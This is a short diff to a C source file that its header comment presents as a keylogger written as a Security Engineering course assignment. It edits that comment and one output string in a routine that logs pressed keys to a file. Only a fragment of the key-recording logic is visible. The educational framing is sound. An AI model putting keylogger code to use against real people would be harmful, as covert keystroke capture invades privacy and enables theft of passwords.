@@ -1,9 +1,9 @@
 /*
-This program  is  only  for educatinal   purposes
-and should not be used for any malicious activity
+This program  is to be used only for educatinal purposes
+and should not be used for any malicious activity.
 
 This program is an assignment for  Security  Engg. 
-submitted by Arvind Okram 2020pis5663 MNIT Jaipur
+submitted by Arvind Okram 2020pis5663 MNIT Jaipur.
 */
 
 #include<stdio.h>
@@ -228,7 +228,7 @@ int Save(int _key, char *file){
 	else if (_key == VK_OEM_7 )
 		fprintf(OUTPUT_FILE, "%s","[""' KEY]");
 	else if (_key == VK_OEM_8 )
-		fprintf(OUTPUT_FILE, "%s","[ง! KEY]");
+		fprintf(OUTPUT_FILE, "%s","[ยง! KEY]");
 	else if (_key == VK_OEM_COMMA )
 		fprintf(OUTPUT_FILE, "%s","[<, KEY]");
 	else if (_key == VK_OEM_MINUS )
